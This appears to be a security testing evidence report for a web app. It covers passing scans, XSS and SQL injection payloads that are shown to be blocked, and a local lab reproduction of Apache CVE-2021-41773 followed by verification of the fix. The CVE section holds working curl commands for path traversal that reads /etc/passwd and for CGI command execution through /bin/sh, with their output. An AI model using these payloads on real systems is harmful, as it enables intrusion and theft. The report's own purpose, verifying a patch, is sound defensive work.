# Local Evidence

Date: 2026-10-19

## 1. Test suite

```text
$ python -m pytest -q
................                                                         [100%]
16 passed in 0.90s
```

## 2. SAST — Bandit

```text
$ python -m bandit -r app -f txt
Run started:2026-10-19 02:29:27

Test results:
    No issues identified.

Code scanned:
    Total lines of code: 395
    Total issues (by severity):
        High: 0
        Medium: 0
        Low: 0
```

## 3. SCA — pip-audit

```text
$ python -m pip_audit -r requirements.txt
No known vulnerabilities found
```

## 4. Runtime checks

### Health

```text
GET /health -> 200 {"status":"ok"}
```

### Access control

```text
GET /api/data without token -> 401
GET /api/me with forged JWT -> 401
```

### Login and data

```text
POST /auth/login -> 200
token_type = Bearer
expires_in = 1800

GET /api/data with token -> 200
count = 2
```

### XSS output encoding

Request body:

```json
{"title":"<script>alert(\"xss\")</script>","body":"<img src=x onerror=\"alert(1)\">"}
```

Response body (JSON-escaped `&` shown as `\u0026`):

```json
{
  "title": "\u0026lt;script\u0026gt;alert(\u0026quot;xss\u0026quot;)\u0026lt;/script\u0026gt;",
  "body": "\u0026lt;img src=x onerror=\u0026quot;alert(1)\u0026quot;\u0026gt;"
}
```

Decoded value:

```text
&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

### SQL injection

```text
GET /api/data?q=' OR 1=1 -- -> 200 {"count":0,"items":[]}
```

The payload did not change the query structure and returned no rows.

## 5. CVE evidence

Environment:

```text
Windows 11, Docker Desktop 4.95.0, Docker Engine 29.8.2
Images:
  vulhub/httpd:2.4.49
  httpd:2.4.51
```

The Docker Hub registry was not reachable directly from this network. The
images were pulled through `dockerproxy.net` and retagged locally; the
build and exploit steps were executed locally.

### 5.1 Vulnerable Apache 2.4.49

Container:

```text
cve-2021-41773-apache-1 | cve-2021-41773-apache |
Up 5 minutes | 0.0.0.0:8080->80/tcp, [::]:8080->80/tcp
```

Path traversal:

```text
$ curl.exe --path-as-is \
    http://127.0.0.1:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

HTTP 200
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
...
```

CGI command execution:

```text
$ curl.exe --path-as-is --data "echo;id" \
    http://127.0.0.1:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

HTTP 200
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

The CGI process runs as `daemon`, not `root`, but this is still arbitrary
command execution outside the document root.

### 5.2 Fixed Apache 2.4.51

Three environments were started simultaneously:

```text
8080  Vulhub Apache 2.4.49, permissive root
8081  Apache 2.4.51, same permissive root
8082  Apache 2.4.51, default deny-by-default root
```

Traversal results:

```text
PORT 8080 traversal HTTP 200 | root:x:0:0:root:/root:/bin/bash ...
PORT 8081 traversal HTTP 400 | <title>400 Bad Request</title>
PORT 8082 traversal HTTP 400 | <title>400 Bad Request</title>
```

CGI results:

```text
PORT 8080 cgi HTTP 200 | uid=1(daemon) gid=1(daemon) groups=1(daemon)
PORT 8081 cgi HTTP 400 | <title>400 Bad Request</title>
PORT 8082 cgi HTTP 400 | <title>400 Bad Request</title>
```

Regression test (normal service):

```text
PORT 8080 root HTTP 200 | <html><body><h1>It works!</h1></body></html>
PORT 8081 root HTTP 200 | <html><body><h1>It works!</h1></body></html>
PORT 8082 root HTTP 200 | <html><body><h1>It works!</h1></body></html>
```

The patched server rejects encoded dot segments with `400 Bad Request` before
they can be mapped to the filesystem. Normal requests still return the default
page, so the fix does not break the service.

### 5.3 Evidence images

![Vulnerable traversal and CGI execution](screenshots/cve-before.png)

![Fixed environments and regression test](screenshots/cve-after.png)

![Local API security checks](screenshots/api-local.png)
